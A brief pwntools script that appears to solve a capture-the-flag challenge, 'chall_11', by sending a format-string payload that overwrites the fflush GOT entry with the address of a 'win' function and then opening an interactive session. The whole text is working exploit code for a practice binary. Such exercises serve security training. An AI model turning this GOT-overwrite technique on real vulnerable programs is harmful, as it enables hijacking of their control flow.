from pwn import *
p=process("./chall_11")
p.sendline("hi")
elf=ELF("./chall_11")
target = elf.got.fflush
elf.sym.win

payload=fmtstr_payload(6, {target: elf.sym.win},write_size='short')

p.sendline(payload)
p.interactive()
